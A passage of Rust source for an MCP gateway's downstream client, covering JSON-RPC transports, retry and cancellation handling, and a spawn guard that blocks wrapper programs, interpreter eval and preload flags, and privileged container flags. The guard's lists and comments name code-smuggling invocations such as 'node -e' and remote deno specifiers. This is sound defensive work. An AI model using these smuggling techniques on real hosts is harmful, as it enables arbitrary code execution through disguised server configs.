//! Downstream MCP client.
//!
//! The gateway is an MCP *server* to the AI client, and an MCP *client* to each
//! real server behind it. This module is that client half: it speaks JSON-RPC to
//! one downstream server over a transport, does the handshake, and lists/calls
//! its tools. The transport is abstracted so the router can be tested with a mock
//! instead of spawning real processes.

use std::collections::{HashMap, HashSet};
use std::io::{BufRead, BufReader, Read, Write};
use std::path::Path;
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
use std::sync::mpsc::{Receiver, RecvTimeoutError, Sender};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use serde_json::{json, Value};

pub const PROTOCOL_VERSION: &str = "2025-06-18";

/// Max time to wait for a single stdio response before giving up. Without this a
/// server that never replies would block its thread (and the batch health probe)
/// forever.
const STDIO_READ_TIMEOUT: Duration = Duration::from_secs(30);
/// Tighter bound for the connect handshake (initialize + tools/list). The batch
/// probe and every router rebuild connect to all servers and wait on the slowest,
/// so one hung server should fail in seconds, not stall everything for the full
/// live-call timeout. Restored to STDIO_READ_TIMEOUT once connected.
const STDIO_CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
/// First-`initialize` budget for download-then-run launchers (npx, uvx, pnpm dlx,
/// ...). On a cold cache these resolve and download the server package before the
/// process can answer anything - easily 15-60s, far past the normal handshake
/// budget - so the tight timeout misreports a healthy-but-installing server as
/// broken (it then works on the next refresh, once the cache is warm). Being
/// alive-but-quiet is expected during the download; a child that actually dies
/// still fails immediately because its stdout closing ends the wait. Batch
/// connects run one thread per server, so several cold launchers install in
/// parallel and a batch waits out this budget at most once, not per server.
const LAUNCHER_CONNECT_TIMEOUT: Duration = Duration::from_secs(120);
/// Keep at most this many bytes of a child's stderr tail for error reporting.
const STDERR_TAIL_CAP: usize = 4096;

/// Cap on how much of a downstream HTTP/SSE response body we buffer, so a malicious
/// or broken server can't stream gigabytes to exhaust gateway memory. Generous: real
/// MCP responses are tiny.
const MAX_RESPONSE_BYTES: u64 = 16 * 1024 * 1024;

/// Retry budget for transient HTTP failures that are SAFE to repeat: a connection
/// that never reached the server, or an explicit 429 rate-limit. We deliberately
/// do NOT retry 5xx or post-send I/O errors, because an MCP `tools/call` is not
/// guaranteed idempotent and may already have executed server-side, so a blind
/// retry could double-execute it (send the email twice, charge the card twice).
pub(crate) const HTTP_MAX_RETRIES: u32 = 2;
/// Base backoff between retries; doubles each attempt, capped at HTTP_RETRY_CAP.
pub(crate) const HTTP_RETRY_BASE: Duration = Duration::from_millis(250);
pub(crate) const HTTP_RETRY_CAP: Duration = Duration::from_secs(10);


/// Error from a single transport request attempt. The caller (Router) owns the
/// retry loop so it can release the per-server Mutex during the backoff sleep,
/// instead of blocking every other agent queued on the same server.
#[derive(Debug, Clone)]
pub enum TransportError {
    /// Non-retryable protocol/application error: the request reached the server and it
    /// responded with an error (or the response was structurally invalid). Does NOT
    /// count against server health - a bad tool call is not a dead server.
    Fatal(String),
    /// The server is unreachable or unresponsive (a read timed out, or the connection
    /// died). Distinct from `Fatal` so the circuit breaker can trip on a genuinely
    /// dead/hung server without counting ordinary error responses against it.
    Unavailable(String),
    /// Retryable: a 429 rate-limit or a connection that never reached the server.
    /// `retry_after` carries the server-advertised delay (Retry-After) if present;
    /// the caller falls back to its own exponential backoff when `None`.
    Retry {
        retry_after: Option<Duration>,
        message: String,
    },
}

/// Tracks client-side JSON-RPC request ids that are currently proxied to a
/// downstream stdio server. A later `notifications/cancelled` from the client can
/// forward cancellation to the downstream server's own request id.
#[derive(Clone, Default)]
pub struct CancelRegistry {
    inner: Arc<Mutex<CancelState>>,
}

#[derive(Default)]
struct CancelState {
    active: HashSet<String>,
    cancelled: HashMap<String, CancelledRequest>,
    in_flight: HashMap<String, CancelEntry>,
}

#[derive(Clone, Default)]
struct CancelledRequest {
    reason: Option<String>,
    forwarded: bool,
}

#[derive(Clone)]
struct CancelEntry {
    stdin: Arc<Mutex<ChildStdin>>,
    downstream_id: Value,
}

/// Cancellation context for one proxied client request.
#[derive(Clone)]
pub struct CancelContext {
    client_request_id: String,
    registry: CancelRegistry,
}

struct CancelGuard {
    client_request_id: String,
    registry: CancelRegistry,
}

impl CancelRegistry {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn begin_client_request(&self, client_request_id: String) -> bool {
        let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
        if state.active.contains(&client_request_id) {
            return false;
        }
        state.active.insert(client_request_id);
        true
    }

    pub fn finish_client_request(&self, client_request_id: &str) {
        let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
        state.active.remove(client_request_id);
        state.cancelled.remove(client_request_id);
        state.in_flight.remove(client_request_id);
    }

    pub fn context(&self, client_request_id: String) -> CancelContext {
        CancelContext { client_request_id, registry: self.clone() }
    }

    /// Mark an active client request as cancelled and, if it has already reached a
    /// stdio downstream, forward `notifications/cancelled` with that downstream id.
    /// Returns true when the referenced client request is still active.
    pub fn cancel(&self, client_request_id: &str, reason: Option<&str>) -> bool {
        let forward = {
            let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
            if !state.active.contains(client_request_id) {
                return false;
            }
            let reason = normalize_cancel_reason(reason);
            let cancelled = state
                .cancelled
                .entry(client_request_id.to_string())
                .or_default();
            if reason.is_some() {
                cancelled.reason = reason;
            }
            prepare_cancel_forward(&mut state, client_request_id)
        };
        if let Some((entry, reason)) = forward {
            entry.send_cancel_async(reason);
        }
        true
    }

    pub fn is_cancelled(&self, client_request_id: &str) -> bool {
        self.inner
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .cancelled
            .contains_key(client_request_id)
    }

    fn forward_cancel_if_ready(&self, client_request_id: &str) {
        let forward = {
            let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
            prepare_cancel_forward(&mut state, client_request_id)
        };
        if let Some((entry, reason)) = forward {
            entry.send_cancel_async(reason);
        }
    }

    fn register(&self, client_request_id: String, entry: CancelEntry) -> CancelGuard {
        let mut state = self.inner.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
        state.in_flight.insert(client_request_id.clone(), entry);
        if let Some(cancelled) = state.cancelled.get_mut(&client_request_id) {
            cancelled.forwarded = false;
        }
        CancelGuard { client_request_id, registry: self.clone() }
    }
}

/// Cap on concurrently-forwarding cancellation threads. The forward is a best-effort
/// `writeln!` to the child's stdin, which blocks if the child isn't draining its pipe.
/// Without a cap, repeated cancellation of a wedged downstream would leak one blocked
/// thread per cancel; past the cap we drop the notification instead.
static CANCEL_THREADS_INFLIGHT: std::sync::atomic::AtomicUsize =
    std::sync::atomic::AtomicUsize::new(0);
const MAX_CANCEL_THREADS: usize = 64;

impl CancelEntry {
    fn send_cancel_async(&self, reason: Option<String>) {
        // Reserve a slot; if too many forwards are already blocked (a downstream that
        // stopped draining its stdin), drop this one rather than leak another thread.
        if CANCEL_THREADS_INFLIGHT.fetch_add(1, Ordering::SeqCst) >= MAX_CANCEL_THREADS {
            CANCEL_THREADS_INFLIGHT.fetch_sub(1, Ordering::SeqCst);
            eprintln!(
                "toolport: dropping cancellation forward (>{MAX_CANCEL_THREADS} already blocked; \
                 downstream not draining stdin)"
            );
            return;
        }
        let entry = self.clone();
        std::thread::spawn(move || {
            if let Err(err) = entry.send_cancel(reason.as_deref()) {
                eprintln!("toolport: failed to forward cancellation downstream: {err}");
            }
            CANCEL_THREADS_INFLIGHT.fetch_sub(1, Ordering::SeqCst);
        });
    }

    fn send_cancel(&self, reason: Option<&str>) -> Result<(), String> {
        let mut params = serde_json::Map::new();
        params.insert("requestId".to_string(), self.downstream_id.clone());
        if let Some(reason) = reason.filter(|s| !s.trim().is_empty()) {
            params.insert("reason".to_string(), Value::String(reason.to_string()));
        }
        let msg = json!({
            "jsonrpc": "2.0",
            "method": "notifications/cancelled",
            "params": Value::Object(params)
        });
        let mut stdin = self.stdin.lock().map_err(|_| "downstream stdin lock poisoned".to_string())?;
        writeln!(stdin, "{msg}").map_err(|e| e.to_string())?;
        stdin.flush().map_err(|e| e.to_string())
    }
}

fn normalize_cancel_reason(reason: Option<&str>) -> Option<String> {
    reason
        .filter(|s| !s.trim().is_empty())
        .map(std::string::ToString::to_string)
}

fn prepare_cancel_forward(
    state: &mut CancelState,
    client_request_id: &str,
) -> Option<(CancelEntry, Option<String>)> {
    let cancelled = state.cancelled.get_mut(client_request_id)?;
    if cancelled.forwarded {
        return None;
    }
    let entry = state.in_flight.get(client_request_id)?.clone();
    cancelled.forwarded = true;
    Some((entry, cancelled.reason.clone()))
}

impl Drop for CancelGuard {
    fn drop(&mut self) {
        self.registry
            .inner
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .in_flight
            .remove(&self.client_request_id);
    }
}

impl TransportError {
    /// True if this reflects the server being unreachable/unhealthy (timeout, dead
    /// connection, or exhausted connection/rate-limit retries) rather than a normal
    /// protocol or application error. Only these trip the per-server circuit breaker.
    pub fn is_health_failure(&self) -> bool {
        matches!(self, TransportError::Unavailable(_) | TransportError::Retry { .. })
    }
}

impl std::fmt::Display for TransportError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TransportError::Fatal(msg) => write!(f, "{msg}"),
            TransportError::Unavailable(msg) => write!(f, "{msg}"),
            TransportError::Retry { message, .. } => write!(f, "{message}"),
        }
    }
}

impl From<String> for TransportError {
    fn from(s: String) -> Self {
        TransportError::Fatal(s)
    }
}

/// Read up to `max` bytes of a ureq response body, lossily as text, never more than
/// the cap even if the server keeps streaming.
fn read_capped(resp: ureq::Response, max: u64) -> String {
    let mut buf = Vec::new();
    let _ = resp.into_reader().take(max).read_to_end(&mut buf);
    String::from_utf8_lossy(&buf).into_owned()
}

/// Exponential backoff for retry `attempt` (0-based): base * 2^attempt, capped.
pub(crate) fn backoff_delay(attempt: u32) -> Duration {
    let mult = 1u32 << attempt.min(6);
    HTTP_RETRY_BASE.saturating_mul(mult).min(HTTP_RETRY_CAP)
}

/// Parse a `Retry-After` value in delta-seconds form (the common 429 form),
/// capped so a hostile or misconfigured server can't park a call for minutes.
fn retry_after_delay(value: &str) -> Option<Duration> {
    value
        .trim()
        .parse::<u64>()
        .ok()
        .map(|s| Duration::from_secs(s).min(HTTP_RETRY_CAP))
}

/// True for transport errors where the request never reached the server (DNS or
/// connection failure), so even a non-idempotent `tools/call` is safe to retry.
/// Post-send I/O errors (e.g. a read timeout after the server got the request)
/// are deliberately excluded, since the call may already have run.
fn is_retryable_transport(t: &ureq::Transport) -> bool {
    matches!(
        t.kind(),
        ureq::ErrorKind::Dns | ureq::ErrorKind::ConnectionFailed
    )
}

/// Build an `Authorization` header value from a raw token, adding the `Bearer`
/// scheme unless the caller already included one.
pub fn bearer_header(token: &str) -> String {
    if token.to_lowercase().starts_with("bearer ") {
        token.to_string()
    } else {
        format!("Bearer {token}")
    }
}

/// Resolve a bare command to a concrete executable.
///
/// On Windows, Node tooling lives in `.cmd` shims (`npx` is really `npx.cmd`),
/// and `Command::new("npx")` won't find it. Search PATH with PATHEXT so bare
/// commands resolve. (Rust 1.77.2+ then runs the resolved `.cmd` via cmd.exe.)
#[cfg(windows)]
pub fn resolve_command(command: &str) -> String {
    let p = Path::new(command);
    if p.extension().is_some() || command.contains('\\') || command.contains('/') {
        return command.to_string();
    }
    let exts = std::env::var("PATHEXT").unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".to_string());
    if let Ok(path) = std::env::var("PATH") {
        for dir in path.split(';').filter(|d| !d.is_empty()) {
            for ext in exts.split(';').filter(|e| !e.is_empty()) {
                let candidate = Path::new(dir).join(format!("{command}{ext}"));
                if candidate.is_file() {
                    return candidate.to_string_lossy().into_owned();
                }
            }
        }
    }
    command.to_string()
}

/// A PATH that includes the user's real shell PATH plus common install dirs.
/// Expand a per-server working directory string (issue #239): a leading `~`
/// (or `~/`) becomes the home dir, and `${VAR}` is replaced with the environment
/// value (unset vars expand to empty). Returns the expanded path; the caller sets
/// it as the child's cwd, and the OS reports a clear error if it doesn't exist.
pub fn expand_cwd(dir: &str) -> std::path::PathBuf {
    // Env vars first, so `~` inside an expanded value is still honored below.
    let mut out = String::with_capacity(dir.len());
    let bytes = dir.as_bytes();
    let mut i = 0;
    while i < dir.len() {
        if bytes[i] == b'$' && dir[i..].starts_with("${") {
            if let Some(end) = dir[i + 2..].find('}') {
                let name = &dir[i + 2..i + 2 + end];
                out.push_str(&std::env::var(name).unwrap_or_default());
                i += 2 + end + 1;
                continue;
            }
        }
        out.push(dir[i..].chars().next().unwrap());
        i += dir[i..].chars().next().unwrap().len_utf8();
    }
    // Leading `~` -> home dir.
    if out == "~" || out.starts_with("~/") || out.starts_with("~\\") {
        if let Some(home) = dirs::home_dir() {
            let rest = out[1..].trim_start_matches(['/', '\\']);
            return if rest.is_empty() { home } else { home.join(rest) };
        }
    }
    std::path::PathBuf::from(out)
}

/// Resolve the reserved `${ROOT}` token in a per-server working directory
/// (issue #239). `${ROOT}` stands for the upstream MCP client's current project
/// directory (its first declared root), resolved here *before* [`expand_cwd`]
/// runs so `${VAR}` expansion can't mistake it for an env var named `ROOT`.
///
/// Returns the cwd string to spawn with, or `None` to inherit the gateway's cwd:
/// - blank config -> `None` (unset)
/// - contains `${ROOT}` with a known `root` -> substituted string
/// - contains `${ROOT}` with no known root (the client declared none, or a
///   context without one such as the desktop probe) -> `None`, so the server
///   falls back to the gateway cwd instead of spawning in the wrong place or
///   being handed a literal `${ROOT}` that would guarantee a spawn failure
/// - no `${ROOT}` -> the (trimmed) config unchanged
pub fn resolve_root_token(cwd: &str, root: Option<&str>) -> Option<String> {
    let trimmed = cwd.trim();
    if trimmed.is_empty() {
        return None;
    }
    if trimmed.contains("${ROOT}") {
        root.map(|r| trimmed.replace("${ROOT}", r))
    } else {
        Some(trimmed.to_string())
    }
}

/// Decode a `file://` URI (the form MCP roots report) to a filesystem path
/// string (issue #239). Uses `url::Url::to_file_path`, which handles the local
/// platform's conventions: POSIX (`file:///home/x`), Windows drive letters
/// (`file:///C:/x`), UNC hosts (`file://server/share`), and percent-decoding.
/// Returns `None` for a non-`file` URI or one that can't be converted to a path.
/// A stdio gateway and its client run on the same machine (this feature is
/// stdio-only), so decoding on the local platform is always correct.
pub fn file_uri_to_path(uri: &str) -> Option<String> {
    let parsed = url::Url::parse(uri).ok()?;
    if parsed.scheme() != "file" {
        return None;
    }
    parsed.to_file_path().ok().map(|p| p.to_string_lossy().into_owned())
}

/// macOS GUI apps (and apps they launch, like the client-spawned gateway) inherit
/// only a minimal PATH, so `npx`/`uvx`/`node` aren't found without this. Computed
/// once and cached.
#[cfg(not(windows))]
pub fn augmented_path() -> &'static str {
    use std::sync::OnceLock;
    static CACHED: OnceLock<String> = OnceLock::new();
    CACHED.get_or_init(|| {
        let mut dirs_list: Vec<String> = std::env::var("PATH")
            .ok()
            .map(|p| p.split(':').map(String::from).collect())
            .unwrap_or_default();
        let mut push = |d: String, list: &mut Vec<String>| {
            if !d.is_empty() && !list.iter().any(|x| *x == d) {
                list.push(d);
            }
        };
        // Best effort: the login shell's PATH (covers nvm/asdf/homebrew/volta).
        if let Ok(shell) = std::env::var("SHELL") {
            if let Ok(out) = std::process::Command::new(&shell)
                .args(["-ilc", "printf %s \"$PATH\""])
                .output()
            {
                if out.status.success() {
                    for d in String::from_utf8_lossy(&out.stdout).split(':') {
                        push(d.to_string(), &mut dirs_list);
                    }
                }
            }
        }
        if let Some(home) = dirs::home_dir() {
            for sub in [".local/bin", ".cargo/bin", ".bun/bin"] {
                push(home.join(sub).to_string_lossy().into_owned(), &mut dirs_list);
            }
        }
        for d in ["/usr/local/bin", "/opt/homebrew/bin", "/usr/bin", "/bin"] {
            push(d.to_string(), &mut dirs_list);
        }
        dirs_list.join(":")
    })
}

#[cfg(not(windows))]
pub fn resolve_command(command: &str) -> String {
    if command.contains('/') {
        return command.to_string();
    }
    for dir in augmented_path().split(':').filter(|d| !d.is_empty()) {
        let candidate = Path::new(dir).join(command);
        if candidate.is_file() {
            return candidate.to_string_lossy().into_owned();
        }
    }
    command.to_string()
}

/// A bidirectional JSON-RPC channel to one downstream server.
pub type ServerRequestHandler = Arc<dyn Fn(&Value) -> Option<Value> + Send + Sync>;

/// True when a downstream line is a server-initiated JSON-RPC request (has method + id,
/// no result/error). Such messages must be answered on the transport, not skipped.
pub fn is_server_initiated_request(v: &Value) -> bool {
    v.get("method").and_then(|m| m.as_str()).is_some()
        && v.get("id").is_some_and(|id| !id.is_null())
        && v.get("result").is_none()
        && v.get("error").is_none()
}

/// A bidirectional JSON-RPC channel to one downstream server.
pub trait Transport: Send {
    fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError>;
    fn request_with_cancel(
        &mut self,
        method: &str,
        params: Value,
        cancel: Option<CancelContext>,
    ) -> Result<Value, TransportError> {
        if cancel.is_some() {
            downstream_trace(&format!(
                "cancellation not supported for downstream transport method {method}"
            ));
        }
        self.request(method, params)
    }
    fn notify(&mut self, method: &str, params: Value) -> Result<(), TransportError>;
    /// Bound how long a single `request` waits for its response. Used to fail the
    /// connect handshake fast. Default no-op: transports with their own fixed
    /// request timeout (e.g. HTTP) ignore it.
    fn set_read_timeout(&mut self, _timeout: Duration) {}
    /// Budget for the connect handshake's `initialize`. Stdio invocations that
    /// download their package before running (npx and friends) report the long
    /// launcher budget; everything else keeps the tight default so one hung
    /// server can't stall a batch probe.
    fn connect_timeout(&self) -> Duration {
        STDIO_CONNECT_TIMEOUT
    }
    /// Start reacting to the server's own `notifications/tools/list_changed`.
    /// Called once the connect handshake is done, so a server that announces its
    /// tools during startup doesn't trigger a needless rebuild. Default no-op:
    /// transports without a live notification stream ignore it.
    fn arm_tools_watch(&mut self) {}
    /// Handle server→client JSON-RPC (roots/list, sampling, …) by forwarding to the
    /// upstream MCP client. Default no-op: unsupported server requests are ignored.
    fn set_server_request_handler(&mut self, _handler: ServerRequestHandler) {}
}

fn downstream_trace(msg: &str) {
    if std::env::var_os("CONDUIT_DEBUG").is_none() {
        return;
    }
    let Some(path) = crate::registry::gateway_log_path() else {
        eprintln!("toolport: {msg}");
        return;
    };
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
    {
        let _ = writeln!(file, "{msg}");
    }
}

/// Bitmask of which downstream list a `notifications/.../list_changed` announces.
/// The gateway watches one flag per transport and, per set bit, re-queries that
/// list and forwards the matching notification on to the client.
pub mod change {
    pub const TOOLS: u8 = 1;
    pub const RESOURCES: u8 = 2;
    pub const PROMPTS: u8 = 4;
}

/// Which downstream list `line` announces a change to (a [`change`] bit), or 0 if
/// it isn't a `list_changed` notification. Lets the stdout drain spot when a server
/// changes its own tools / resources / prompts mid-session.
fn list_changed_kind(line: &str) -> u8 {
    // Cheap gate: skip the JSON parse for the overwhelming majority of lines
    // (ordinary responses to our requests) that can't be one of these.
    if !line.contains("list_changed") {
        return 0;
    }
    match serde_json::from_str::<Value>(line.trim())
        .ok()
        .as_ref()
        .and_then(|v| v.get("method"))
        .and_then(|m| m.as_str())
    {
        Some("notifications/tools/list_changed") => change::TOOLS,
        Some("notifications/resources/list_changed") => change::RESOURCES,
        Some("notifications/prompts/list_changed") => change::PROMPTS,
        _ => 0,
    }
}

/// True if `line` is specifically a `tools/list_changed` notification.
#[cfg(test)]
fn is_list_changed(line: &str) -> bool {
    list_changed_kind(line) == change::TOOLS
}

/// Forward one drained stdout line to the request loop, first flagging `dirty` if
/// the server (once `armed`) announced a tool-list change. Returns false when the
/// receiver is gone (transport closed) so the drain loop can stop.
fn forward_line(
    line: String,
    tx: &Sender<String>,
    dirty: &Option<Arc<AtomicU8>>,
    armed: &Arc<AtomicBool>,
) -> bool {
    if let Some(flag) = dirty {
        if armed.load(Ordering::SeqCst) {
            let kind = list_changed_kind(&line);
            if kind != 0 {
                flag.fetch_or(kind, Ordering::SeqCst);
            }
        }
    }
    tx.send(line).is_ok()
}

/// Spawn-time supply-chain guard. Toolport runs stdio servers as full-privilege
/// host processes, so this is NOT a sandbox; it refuses the specific *smuggling*
/// techniques where a benign-looking launcher (`node`, `docker`, `sh`) is turned
/// into arbitrary code execution or a privileged container by its arguments. The
/// threat is a booby-trapped server config the member did not author (a team-pushed
/// or registry-imported entry) whose command reads as harmless but whose args
/// inject code. High-precision by design: it only trips on interpreter inline-eval
/// / module-preload flags and container-escape flags, none of which a normal
/// `npx` / `uvx` / binary MCP server needs. Returns `Err(reason)` to block the
/// spawn; the reason surfaces to the member.
/// Wrapper programs that run their first bare argument as the REAL command, so
/// screening only the wrapper name lets `sudo node -e <code>` (or `time`, `flock`, ...)
/// smuggle an interpreter past every check below. Parsing each wrapper's own flags to
/// find the inner command is fragile, and a parse slip is a silent bypass, so we refuse
/// these outright. (`env` is handled specially below so the common `env VAR=val cmd`
/// pattern keeps working.) A server that needs a wrapper ships a dedicated launcher.
const LAUNCHER_WRAPPERS: &[&str] = &[
    "sudo", "doas", "su", "runuser", "pkexec", "time", "nice", "nohup", "xargs",
    "stdbuf", "timeout", "setsid", "ionice", "chrt", "taskset", "setarch", "unbuffer",
    "script", "watch", "flock", "busybox", "proxychains", "proxychains4", "torify",
    "chroot", "capsh", "firejail", "wine",
    // Namespace / privilege / sandbox launchers and debuggers/tracers that also run their
    // first bare argument as the real program (`strace node -e <code>`, `nsenter … <cmd>`),
    // so screening only the wrapper name is the same silent bypass as sudo/time. (`qemu-*`
    // user-mode emulators do the same and are matched by prefix in screen_spawn_command.)
    "nsenter", "unshare", "systemd-run", "setpriv", "gosu", "strace", "ltrace", "gdb",
    "valgrind", "proot", "bwrap", "catchsegv", "eatmydata", "parallel", "rlwrap",
    "dbus-run-session", "xvfb-run",
];

pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String> {
    let base = command_basename(command);
    // `env [VAR=val ...] <cmd> [args]` is a common, legitimate config pattern, so rather
    // than refuse it we peel off the leading assignments (screened like the env field)
    // and screen the real inner command. env with its own flags is unusual and hard to
    // parse safely, so that still fails closed.
    if base == "env" {
        return screen_env_wrapper(args);
    }
    if LAUNCHER_WRAPPERS.contains(&base.as_str()) || base.starts_with("qemu-") {
        return Err(format!(
            "refusing to launch '{command}': wrapper programs like sudo/time/flock run \
             another command from their arguments, which would bypass Toolport's spawn \
             guard. Set environment variables in the server's env field, and name the \
             real program as the command."
        ));
    }
    // Dispatch on the interpreter FAMILY so a versioned or renamed binary
    // (`python3.10`, `python3.10.exe`) screens the same as `python`.
    let dangerous: Option<&str> = match interpreter_family(&base) {
        // Interpreters: inline-eval and module-preload execute attacker-supplied
        // code without a script file on disk. `clustered_eval` additionally catches an
        // eval flag packed into a getopt cluster (`python -Ec`, `ruby -we`, `sh -ec`).
        "node" | "nodejs" => node_dangerous(args),
        "bun" => bun_dangerous(args),
        "deno" => deno_dangerous(args),
        // py/pyw are the Windows Python launchers; they forward `-c` (and version
        // selectors like `-3.11`) to the selected interpreter, so screen them as Python.
        "python" | "python2" | "python3" | "pypy" | "pypy3" | "py" | "pyw" => {
            first_flag(args, &["-c"]).or_else(|| clustered_eval(args, &['c'], PYTHON_BOOL))
        }
        "ruby" => first_flag(args, &["-e"]).or_else(|| clustered_eval(args, &['e'], RUBY_BOOL)),
        "perl" => first_flag(args, &["-e"]).or_else(|| clustered_eval(args, &['e'], PERL_BOOL)),
        // php: -r/-R run inline code (-R lowercases to -r), -B runs code before input.
        "php" => first_flag(args, &["-r", "-b"]),
        "awk" | "gawk" | "mawk" | "nawk" => awk_dangerous(args),
        // More interpreters whose `-e`/`--eval` runs an inline program with no file.
        "osascript" | "elixir" | "iex" | "lua" | "luajit" | "rscript" | "r" | "julia"
        | "groovy" | "scala" | "clojure" | "bb" | "tclsh" | "wish" => {
            first_flag(args, &["-e", "--eval", "--eval-string"])
        }
        // Shells: `-c <string>` runs an arbitrary line, incl. clustered `sh -ec <string>`.
        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" => {
            first_flag(args, &["-c", "-command", "/c", "/k", "/command"])
                .or_else(|| clustered_eval(args, &['c'], SHELL_BOOL))
        }
        // Windows cmd uses `/c` `/k` switches (not getopt clustering), so no cluster check.
        "cmd" => first_flag(args, &["-c", "-command", "/c", "/k", "/command"]),
        // PowerShell also runs code via `-EncodedCommand` (base64) and any unambiguous
        // abbreviation of `-Command`, none of which an exact-match list catches.
        "pwsh" | "powershell" => pwsh_dangerous(args),
        // Container runtimes: privileged mode, capability/device passthrough, and
        // host-namespace sharing escalate past a normal host process (a plain `-v`
        // mount does not, and stays allowed; see container_escape_flag).
        "docker" | "podman" | "nerdctl" => container_escape_flag(args),
        _ => None,
    };
    match dangerous {
        Some(flag) => Err(format!(
            "refusing to launch '{command}': the argument '{flag}' can execute \
             arbitrary code or escape isolation. Toolport blocks inline-eval and \
             privileged-container flags on spawned servers as a supply-chain guard. \
             If this server is yours and you trust it, run it from a dedicated script \
             or launcher you control instead of an inline command."
        )),
        None => Ok(()),
    }
}

/// Node/Bun eval + module-preload flags, in `--flag[=x]` form AND the attached short
/// form node accepts for require (`-r./pwn.js`), which a plain equality check misses.
fn node_dangerous(args: &[String]) -> Option<&str> {
    const FLAGS: &[&str] = &[
        "-e", "--eval", "-p", "--print", "-r", "--require", "--import", "--loader",
        "--experimental-loader", "--preload",
    ];
    args.iter()
        .find(|a| {
            let al = a.to_ascii_lowercase();
            let head = al.split('=').next().unwrap_or(&al);
            FLAGS.contains(&head)
                // `-r<module>` attached (single dash), e.g. `-r./pwn.js`.
                || (al.starts_with("-r") && al.len() > 2 && !al.starts_with("--"))
        })
        .map(|a| a.as_str())
        // getopt clustering packs `-p` (print) and `-e` (eval): `node -pe '<code>'`.
        .or_else(|| clustered_eval(args, &['e', 'p'], &['i', 'v', 'h']))
}

/// A remote code specifier deno/bun will fetch and execute: an http(s) URL, an
/// `npm:` / `jsr:` registry ref, or a `data:` inline-source URL. `deno run npm:evil`
/// and `deno run 'data:text/javascript,<code>'` run untrusted code the same as
/// `deno run https://evil`, so all are screened.
fn remote_specifier(arg: &str) -> bool {
    let a = arg.to_ascii_lowercase();
    a.starts_with("http://")
        || a.starts_with("https://")
        || a.starts_with("npm:")
        || a.starts_with("jsr:")
        || a.starts_with("data:")
}

/// Walk deno/bun-style args to the operand at or after `from`, skipping option tokens and
/// the value of a known space-separated value option (`--config x`) so the subcommand and
/// its executable target aren't mistaken for an option's value. Returns the operand and its
/// index.
fn next_operand<'a>(args: &'a [String], from: usize, value_opts: &[&str]) -> (Option<&'a str>, usize) {
    let mut j = from;
    while let Some(a) = args.get(j) {
        if a.starts_with('-') {
            if value_opts.contains(&a.as_str()) {
                j += 1; // this option consumes the next token as its value
            }
            j += 1;
        } else {
            return (Some(a.as_str()), j);
        }
    }
    (None, j)
}

/// Deno's lethal invocations are SUBCOMMANDS, not flags: `eval <code>` runs inline code,
/// and `run`/`serve <remote>` executes code fetched from the network or a registry. A
/// `deno run` of a LOCAL script is the normal case and stays allowed. Global value options
/// are skipped so `deno --config x eval …` / `deno --config x run npm:…` can't hide the
/// subcommand, and only the executable TARGET is remote-checked — a URL passed as an
/// application argument (`deno run ./s.ts --url https://api`) is not fetched code.
fn deno_dangerous(args: &[String]) -> Option<&str> {
    const VALUE_OPTS: &[&str] = &[
        "--config", "-c", "--import-map", "--lock", "--cert", "--v8-flags", "--seed",
        "--log-level", "-L",
    ];
    let (sub, si) = next_operand(args, 0, VALUE_OPTS);
    let Some(sub) = sub else { return None };
    if sub.eq_ignore_ascii_case("eval") {
        return Some(sub);
    }
    if sub.eq_ignore_ascii_case("run") || sub.eq_ignore_ascii_case("serve") {
        if let (Some(target), _) = next_operand(args, si + 1, VALUE_OPTS) {
            if remote_specifier(target) {
                return Some(target);
            }
        }
    }
    None
}

/// Bun shares node's eval/preload flags, and additionally executes a remote specifier
/// via `bun run <remote>`. (`bun run <script>` / `bun x <pkg>` of a local/registry
/// package is the normal case, like npx, and stays allowed.)
fn bun_dangerous(args: &[String]) -> Option<&str> {
    if let Some(f) = node_dangerous(args) {
        return Some(f);
    }
    // Like deno: skip global value options and remote-check only the executable target, so
    // `bun --cwd x run https://evil` is caught while a URL passed as an app arg is ignored.
    const VALUE_OPTS: &[&str] = &["--cwd", "--config", "-c"];
    let (sub, si) = next_operand(args, 0, VALUE_OPTS);
    let Some(sub) = sub else { return None };
    let (target, _) = if sub.eq_ignore_ascii_case("run")
        || sub.eq_ignore_ascii_case("x")
        || sub.eq_ignore_ascii_case("exec")
    {
        next_operand(args, si + 1, VALUE_OPTS)
    } else {
        (Some(sub), si) // implicit run: the first operand is the target itself
    };
    if let Some(target) = target {
        if remote_specifier(target) {
            return Some(target);
        }
    }
    None
}

/// awk runs its program from a `-f file` OR inline as the first bare arg. An inline
/// program (`awk 'BEGIN{system(...)}'`) is arbitrary code with no file on disk, so an
/// awk invocation WITHOUT a `-f`/`--file` is refused; `awk -f script.awk` is allowed.
fn awk_dangerous(args: &[String]) -> Option<&str> {
    let has_file = args.iter().any(|a| {
        let al = a.to_ascii_lowercase();
        al == "-f" || al == "--file" || al.starts_with("--file=") || (al.starts_with("-f") && al.len() > 2)
    });
    if has_file {
        return None;
    }
    args.iter().find(|a| !a.starts_with('-')).map(|a| a.as_str())
}

/// Screen `env [VAR=val ...] <cmd> [args]`: peel the leading assignments (screened the
/// same way as the config's env field, so `env LD_PRELOAD=x node` is caught), then
/// screen the real inner command. `env` with its own flags (`-S`, `-u`, `-i`, ...) is
/// unusual and fragile to parse, so it fails closed.
fn screen_env_wrapper(args: &[String]) -> Result<(), String> {
